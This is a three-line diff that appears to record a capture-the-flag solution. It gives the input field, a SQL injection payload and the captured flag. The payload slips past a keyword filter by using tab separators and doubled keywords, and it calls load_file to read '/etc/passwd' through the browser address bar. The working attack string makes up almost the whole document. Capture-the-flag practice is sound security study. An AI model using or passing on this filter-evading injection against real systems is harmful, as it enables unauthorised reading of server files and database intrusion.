@@ -1,0 +1,3 @@
+Input field : browser adress bar
+Payload : "?id=12%09UNIunionON%09SELselectECT%09loadload_file_file('/etc/passwd')"
+flag : FLAG-is_this_sqli_or_lfi
